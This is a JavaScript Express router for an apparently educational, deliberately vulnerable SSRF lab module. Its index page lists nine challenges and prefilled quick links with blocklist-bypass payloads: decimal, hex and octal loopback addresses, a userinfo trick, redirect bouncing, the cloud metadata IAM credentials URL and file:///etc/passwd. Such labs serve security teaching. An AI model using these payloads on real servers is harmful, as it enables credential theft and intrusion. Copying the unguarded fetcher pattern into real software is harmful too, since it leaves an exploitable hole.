'use strict';
// Server-Side Request Forgery (SSRF): an intentionally vulnerable URL
// fetcher. Thin aggregator: every challenge lives in ./challenges/* and the
// module-level internal endpoints plus the index page live here.
const express = require('express');
const { fixCta, brief, difficultyPill, esc, hintLadder, page, payloadBlock, toolsPill, trackBanner  } = require('../../lib/page');

const challenges = [
  require('./challenges/basic'),
  require('./challenges/bypass'),
  require('./challenges/ssrf-redirect'),
  require('./challenges/ssrf-userinfo'),
  require('./challenges/ssrf-hex-ip'),
  require('./challenges/ssrf-octal-ip'),
  require('./challenges/ssrf-zero-ip'),
  require('./challenges/ssrf-metadata'),
  require('./challenges/ssrf-file'),
];

const router = express.Router();

function port() {
  return process.env.PORT || 3000;
}

const SECRET_MARKER = 'SSRF-INTERNAL-9921';

// ---- Module-level internal endpoints -------------------------------------
// Would be unreachable from outside in a real deployment; SSRF lets the
// attacker reach them through the server itself. They are not part of any
// single challenge: every fetcher reaches them via server-side requests.

router.get('/internal/status', (req, res) => {
  res.type('text').send('internal ok');
});

router.get('/internal/secret', (req, res) => {
  res.type('text').send(`internal secret marker: ${SECRET_MARKER}`);
});

// GET /ssrf -> module index page.
router.get('/', (req, res) => {
  const p = port();
  const internalSecret = `http://127.0.0.1:${p}/ssrf/internal/secret`;
  const bypassA = `http://2130706433:${p}/ssrf/internal/secret`;
  const bypassB = `http://0.0.0.0:${p}/ssrf/internal/secret`;
  const redirectVia = `http://localhost:${p}/ssrf/jump?to=${encodeURIComponent(`http://127.0.0.1:${p}/ssrf/internal/secret`)}`;
  const userinfoVia = `http://pentrix.lab@127.0.0.1:${p}/ssrf/internal/secret`;
  const hexVia = `http://0x7f.0.0.1:${p}/ssrf/internal/secret`;
  const octalVia = `http://0177.0.0.1:${p}/ssrf/internal/secret`;
  const zeroVia = `http://0.0.0.0:${p}/ssrf/internal/secret`;
  const metaVia = `http://169.254.169.254/latest/meta-data/iam/security-credentials/`;

  const cards = challenges.map(({ vuln: v }) => `
    <article class="vuln-card" id="${esc(v.id)}">
      <h3>${esc(v.name)} ${difficultyPill(v.difficulty)}</h3>
      <p>${esc(v.how)}</p>
      ${v.start ? payloadBlock('Starting point', v.start) : ''}
      ${hintLadder(v)}
      ${toolsPill(v)}
    </article>`).join('');

  // M11 break-then-fix: honest coming-soon note (additive, existing content untouched).
  const fixSectionHtml = `
    <section class="fix-mode-section">
      <h2>Break then fix</h2>
      <p class="dim">Fix mode is not available for this module yet. When it lands, you will be able to repair each challenge: edit the vulnerable code and the runner will check that the exploit is blocked while legitimate use still works.</p>
      ${challenges.map((c) => fixCta('ssrf', c.vuln.id)).join('')}
    </section>`;
  res.send(page('Server-Side Request Forgery', `
    ${brief('Server-Side Request Forgery', `
      This module exposes a small service that fetches a URL <b>on the server side</b>
      and shows you the response. The server has two internal-only endpoints
      (<code>/ssrf/internal/status</code> and <code>/ssrf/internal/secret</code>)
      that are meant for the server itself, not for you. Your goal is to trick the
      fetcher into reaching them and leaking the secret marker.`)}
    ${trackBanner(module.exports)}

    <h2>Challenges</h2>
    <p>Nine fetchers, nine ways to make the server fetch for you. Each challenge
    card has a hint ladder: level 1 nudges, level 2 teaches the technique,
    level 3 shows the payload shape.</p>
    ${cards}

    <h2>Fetchers</h2>
    <p class="dim">Prefer the browser? Each fetcher has a form. The open
    fetcher answers anything; the others each hide a naive check for you to
    defeat.</p>
    <form action="/ssrf/fetch" method="get" class="clay-card">
      <div class="clay-field">
        <label for="url1">Open fetcher (no checks at all)</label>
        <input class="clay-input" id="url1" name="url" size="60" placeholder="http://example.com/">
      </div>
      <button class="clay-btn clay-btn-primary" type="submit">Fetch</button>
    </form>
    <form action="/ssrf/fetch2" method="get" class="clay-card">
      <div class="clay-field">
        <label for="url2">Blocklisted fetcher</label>
        <input class="clay-input" id="url2" name="url" size="60" placeholder="http://example.com/">
      </div>
      <button class="clay-btn clay-btn-primary" type="submit">Fetch</button>
    </form>
    <form action="/ssrf/fetch3" method="get" class="clay-card">
      <div class="clay-field">
        <label for="url3">Redirect follower (blocklist sees only the first URL)</label>
        <input class="clay-input" id="url3" name="url" size="60" placeholder="http://example.com/">
      </div>
      <button class="clay-btn clay-btn-primary" type="submit">Fetch</button>
    </form>
    <form action="/ssrf/userinfo" method="get" class="clay-card">
      <div class="clay-field">
        <label for="url4a">Allowlisted fetcher (wants <code>pentrix.lab</code>)</label>
        <input class="clay-input" id="url4a" name="url" size="60" placeholder="http://pentrix.lab/">
      </div>
      <button class="clay-btn clay-btn-primary" type="submit">Fetch</button>
    </form>
    <form action="/ssrf/hex-ip" method="get" class="clay-card">
      <div class="clay-field">
        <label for="url4b">Hex IP fetcher</label>
        <input class="clay-input" id="url4b" name="url" size="60" placeholder="http://0x7f.0.0.1:PORT/ssrf/internal/secret">
      </div>
      <button class="clay-btn clay-btn-primary" type="submit">Fetch</button>
    </form>
    <form action="/ssrf/octal-ip" method="get" class="clay-card">
      <div class="clay-field">
        <label for="url4c">Octal IP fetcher</label>
        <input class="clay-input" id="url4c" name="url" size="60" placeholder="http://0177.0.0.1:PORT/ssrf/internal/secret">
      </div>
      <button class="clay-btn clay-btn-primary" type="submit">Fetch</button>
    </form>
    <form action="/ssrf/zero-ip" method="get" class="clay-card">
      <div class="clay-field">
        <label for="url4d">0.0.0.0 fetcher</label>
        <input class="clay-input" id="url4d" name="url" size="60" placeholder="http://0.0.0.0:PORT/ssrf/internal/secret">
      </div>
      <button class="clay-btn clay-btn-primary" type="submit">Fetch</button>
    </form>
    <form action="/ssrf/fetch-meta" method="get" class="clay-card">
      <div class="clay-field">
        <label for="url5">Cloud metadata fetcher</label>
        <input class="clay-input" id="url5" name="url" size="60" placeholder="http://169.254.169.254/latest/meta-data/">
      </div>
      <button class="clay-btn clay-btn-primary" type="submit">Fetch</button>
    </form>
    <form action="/ssrf/fetch-file" method="get" class="clay-card">
      <div class="clay-field">
        <label for="url6">File scheme fetcher</label>
        <input class="clay-input" id="url6" name="url" size="60" placeholder="file:///etc/passwd">
      </div>
      <button class="clay-btn clay-btn-primary" type="submit">Fetch</button>
    </form>

    <h2>Quick links</h2>
    <ul>
      <li><a href="/ssrf/internal/status">Internal status endpoint</a> (see what it returns)</li>
      <li><a href="/ssrf/fetch?url=${encodeURIComponent(internalSecret)}">Fetch the internal secret via the open fetcher</a></li>
      <li><a href="/ssrf/fetch2?url=${encodeURIComponent(bypassA)}">Bypass attempt: decimal loopback</a></li>
      <li><a href="/ssrf/fetch2?url=${encodeURIComponent(bypassB)}">Bypass attempt: 0.0.0.0</a></li>
      <li><a href="/ssrf/fetch3?url=${encodeURIComponent(redirectVia)}">Redirect lab: bounce through /ssrf/jump to the internal secret</a></li>
      <li><a href="/ssrf/userinfo?url=${encodeURIComponent(userinfoVia)}">Userinfo trick vs the pentrix.lab allowlist</a></li>
      <li><a href="/ssrf/hex-ip?url=${encodeURIComponent(hexVia)}">Hex IP bypass</a></li>
      <li><a href="/ssrf/octal-ip?url=${encodeURIComponent(octalVia)}">Octal IP bypass</a></li>
      <li><a href="/ssrf/zero-ip?url=${encodeURIComponent(zeroVia)}">0.0.0.0 bypass</a></li>
      <li><a href="/ssrf/fetch-meta?url=${encodeURIComponent(metaVia)}">Cloud metadata credentials</a></li>
      <li><a href="/ssrf/fetch-file?url=${encodeURIComponent('file:///etc/passwd')}">file:///etc/passwd</a></li>
    </ul>
  ${fixSectionHtml}
`));
});

for (const c of challenges) router.use(c.router);

module.exports = {
  id: 'ssrf',
  name: 'Server-Side Request Forgery',
  tagline: 'Make the server fetch URLs for you, then turn it against its own internals.',
  description: 'The app fetches user-supplied URLs server-side. Pivot through it to reach internal-only endpoints and bypass a naive blocklist.',
  difficulty: 'Advanced',
  track: 'Advanced',
  prerequisites: ['Injection track'],
  vulns: challenges.map((c) => c.vuln),
  router,
};
